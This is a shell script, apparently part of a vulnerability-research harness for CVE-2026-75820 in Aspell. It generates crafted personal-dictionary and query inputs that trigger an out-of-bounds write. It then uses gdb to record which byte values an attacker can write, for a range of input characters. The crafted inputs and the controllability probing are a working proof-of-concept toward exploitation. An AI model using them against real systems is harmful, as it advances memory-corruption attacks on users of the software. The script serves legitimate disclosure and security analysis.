#!/bin/sh
# CVE-2026-75820: byte-value controllability of the real-consumer OOB store.
#
# The OOB store in Working::fine_tune_score is
#   mov %r12b,(%r14)   ; r12b = to_normalized(source[j])
# at fine_tune_score+2220 in the recover-mode ASan 0.60.8.2 build described
# in harness/evidence/75820-write/REPLAY.txt. Break there, dump the byte at
# the destination before and after the single-step, and repeat for 26 input
# letters. ASan's 0xbe malloc fill makes the before value unambiguous.
#
# Usage: EXE=/abs/build-vuln/aspell STORE_ADDR=0x... \
#   sh harness/75820-byte-sweep.sh [work-dir] [output-dir]
# EXE defaults to <work-dir>/build-vuln/aspell (work dir defaults to the
# 75820-write-probe.sh work dir); see evidence/75820-byte-sweep/REPLAY.txt.
base="$(cd "$(dirname "$0")/.." && pwd)"
exe="${EXE:-${1:-/tmp/aspell-75820-write-work}/build-vuln/aspell}"
store="${STORE_ADDR:-0x5555557d0fac}"
out="${2:-$base/harness/evidence/75820-byte-sweep}"
out="$(mkdir -p "$out" && cd "$out" && pwd)"
dict="$base/real-build/en-install/dict"
data="$base/real-build/en-install/data"
export ASAN_OPTIONS=detect_leaks=0:halt_on_error=0:abort_on_error=0
: > "$out/summary.txt"
for c in a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 '!'; do
  w=$(printf '%*s' 257 '' | tr ' ' "$c")
  w42=$(printf '%*s' 42 '' | tr ' ' "$c")
  q=$(printf '%*s' 299 '' | tr ' ' "$c")
  printf 'personal_ws-1.1 en 1 utf-8\n%s%s%s\n' "$w" '!' "$w42" > "$out/personal-$c"
  printf '%s\n' "$q" > "$out/query-$c"
  cat > "$out/gdb-$c.cmd" <<EOF
set pagination off
set confirm off
break *$store
run --lang=en --dont-validate-words --dict-dir=$dict --data-dir=$data --personal=$out/personal-$c -a < $out/query-$c
x/2bx \$r14
si
x/2bx \$r14
quit
EOF
  gdb -batch -x "$out/gdb-$c.cmd" "$exe" > "$out/gdb-$c.out" 2>&1
  addr=$(grep -m1 '^0x[0-9a-f]*:' "$out/gdb-$c.out" | awk '{print $1}')
  before=$(grep -m1 '^0x[0-9a-f]*:' "$out/gdb-$c.out" | awk '{print $2}')
  after=$(grep '^0x[0-9a-f]*:' "$out/gdb-$c.out" | tail -1 | awk '{print $2}')
  hit=$(grep -c 'Breakpoint 1' "$out/gdb-$c.out")
  printf '%s hit=%s addr=%s before=%s after=%s\n' \
    "$c" "$hit" "$addr" "$before" "$after" | tee -a "$out/summary.txt"
done
